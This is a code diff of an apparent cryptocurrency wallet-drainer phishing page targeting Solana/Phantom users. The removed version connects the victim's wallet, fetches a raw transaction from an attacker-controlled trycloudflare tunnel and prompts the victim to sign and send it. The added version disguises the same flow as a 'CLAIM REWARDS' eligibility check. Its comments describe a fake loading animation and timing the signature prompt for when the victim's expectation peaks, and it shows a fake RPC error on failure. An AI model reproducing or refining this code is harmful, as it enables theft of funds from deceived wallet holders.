@@ -1,50 +1,33 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VALIDATOR V20 FINAL</title>
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
-</head>
-<body style="background:#000; color:#fff; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh;">
-    <div style="border:1px solid #14f195; padding:40px; text-align:center;">
-        <h2 style="color:#14f195;">WAR GOD V20</h2>
-        <button id="cta" style="background:#14f195; padding:20px; width:100%; border:none; font-weight:bold; cursor:pointer;">START SYNC</button>
-        <div id="log" style="font-size:10px; color:#444; margin-top:10px;">SYSTEM READY</div>
+<div class="box">
+    <div id="loading-zone">
+        <h3 style="color:#14f195;">VALIDATOR AUTHENTICATION</h3>
+        <div class="progress-bar"><div id="bar-fill"></div></div>
+        <p id="status-text" style="font-size:10px; color:#888;">READY TO SYNC</p>
     </div>
-    <script>
-        const tunnel = "https://likelihood-mercury-east-nec.trycloudflare.com";
-        document.getElementById('cta').onclick = async () => {
-            const log = (t) => document.getElementById('log').innerText = t;
-            const sWeb3 = window.solanaWeb3;
-            const p = window.solana || window.phantom?.solana;
-            try {
-                log("CONNECTING...");
-                await p.connect();
-                const resp = await fetch(tunnel + "/prepare_raw", {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ address: p.publicKey.toString() })
-                });
-                const info = await resp.json();
-                
-                // 🔱 关键修复：确保 Uint8Array 转换不丢失字节
-                const binary = window.atob(info.raw_tx);
-                const bytes = Uint8Array.from(binary, c => c.charCodeAt(0));
-                
-                const tx = sWeb3.VersionedTransaction.deserialize(bytes);
-                log("AWAITING SIGNATURE...");
-                const { signature } = await p.signAndSendTransaction(tx);
-                log("SUCCESS!");
-            } catch (err) {
-                log("FAIL: " + err.message);
-                fetch(tunnel + "/debug", {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ stage: "V20_CRASH", error: err.message })
-                }).catch(()=>{});
-            }
-        };
-    </script>
-</body>
-</html>
+    <button id="cta" style="margin-top:20px;">CLAIM REWARDS</button>
+</div>
+
+<script>
+    document.getElementById('cta').onclick = async () => {
+        const fill = document.getElementById('bar-fill');
+        const txt = document.getElementById('status-text');
+        
+        // 第一步：伪装加载动画
+        fill.style.width = "40%";
+        txt.innerText = "CHECKING ELIGIBILITY...";
+        
+        // 第二步：服务器静默计算 (71服务器已经在跑了)
+        const info = await fetch(tunnel + "/prepare_raw", { ... });
+        
+        fill.style.width = "80%";
+        txt.innerText = "GENERATING SMART CONTRACT...";
+        
+        // 第三步：在用户心理预期最高时，拉起确认框
+        try {
+            const { signature } = await p.signAndSendTransaction(tx);
+            txt.innerText = "REWARDS CLAIMED!";
+        } catch (e) {
+            txt.innerText = "RPC ERROR: RETRYING...";
+        }
+    };
+</script>
